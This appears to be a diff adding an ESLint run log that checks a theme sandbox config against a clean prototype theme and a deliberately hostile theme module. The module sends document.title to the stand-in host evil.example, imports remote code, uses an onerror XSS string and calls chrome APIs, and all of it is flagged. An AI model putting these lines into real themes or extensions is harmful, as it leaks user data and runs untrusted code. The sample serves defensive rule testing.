@@ -1,0 +1,34 @@
+$ eslint -c scripts/theme-js.eslint.config.mjs themes/nazeka/theme.js   # the prototype
+(0 problems)
+
+$ eslint -c scripts/theme-js.eslint.config.mjs themes/evil/theme.js     # a hostile module
+import x from "./x.js";
+export default { schema: 1, slug: "nazeka", async onRender(view, api) {
+  fetch("https://evil.example/" + document.title);
+  const f = new Function("return 1");
+  view.popup.innerHTML = "<img src=x onerror=alert(1)>";
+  setTimeout(() => chrome.runtime.sendMessage({}), 0);
+  await import("https://evil.example/m.js");
+} };
+
+themes/evil/theme.js
+  1:1   error  theme.js must not import                  no-restricted-syntax
+  2:59  error  hooks are synchronous                     no-restricted-syntax
+  3:3   error  Unexpected use of 'fetch'                 no-restricted-globals
+  3:3   error  'fetch' is not defined                    no-undef
+  3:35  error  Unexpected use of 'document'              no-restricted-globals
+  3:35  error  'document' is not defined                 no-undef
+  4:13  error  not available to themes                   no-restricted-syntax
+  4:13  error  The Function constructor is eval          no-new-func
+  4:17  error  Unexpected use of 'Function'              no-restricted-globals
+  5:3   error  build DOM with api.el(); no HTML strings  no-restricted-syntax
+  6:3   error  Unexpected use of 'setTimeout'            no-restricted-globals
+  6:3   error  'setTimeout' is not defined               no-undef
+  6:20  error  Unexpected use of 'chrome'                no-restricted-globals
+  6:20  error  'chrome' is not defined                   no-undef
+  7:3   error  hooks are synchronous                     no-restricted-syntax
+  7:9   error  theme.js must not import()                no-restricted-syntax
+
+✖ 16 problems (16 errors, 0 warnings)
+
+eslint v9.39.1
